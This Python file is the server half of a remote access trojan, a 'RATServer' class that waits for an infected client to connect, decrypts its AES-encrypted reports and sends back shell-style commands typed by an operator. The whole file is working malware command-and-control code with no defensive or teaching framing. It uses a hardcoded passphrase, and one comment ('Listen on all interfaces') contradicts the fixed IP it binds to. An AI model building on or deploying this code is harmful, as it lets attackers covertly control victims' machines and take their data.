import socket
from Crypto.Cipher import AES
import base64
import hashlib

class RATServer:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.key = hashlib.sha256(b'my_secure_passphrase').digest()  # Must match client's key
        self.conn = None
        self.addr = None

    def decrypt_data(self, data):
        raw_data = base64.b64decode(data)
        nonce, tag, ciphertext = raw_data[:16], raw_data[16:32], raw_data[32:]
        cipher = AES.new(self.key, AES.MODE_EAX, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)

    def encrypt_data(self, data):
        cipher = AES.new(self.key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        return base64.b64encode(cipher.nonce + tag + ciphertext)

    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.server_ip, self.server_port))
        server.listen(5)
        print(f"[*] Listening on {self.server_ip}:{self.server_port}")

        self.conn, self.addr = server.accept()
        print(f"[*] Accepted connection from {self.addr}")

        while True:
            data = self.conn.recv(1024)
            if not data:
                break
            print(f"Received: {self.decrypt_data(data).decode('utf-8')}")
            command = input("Enter command: ")
            self.conn.sendall(self.encrypt_data(command.encode('utf-8')))

if __name__ == "__main__":
    server = RATServer('192.168.0.3', 9999)  # Listen on all interfaces
    server.start_server()
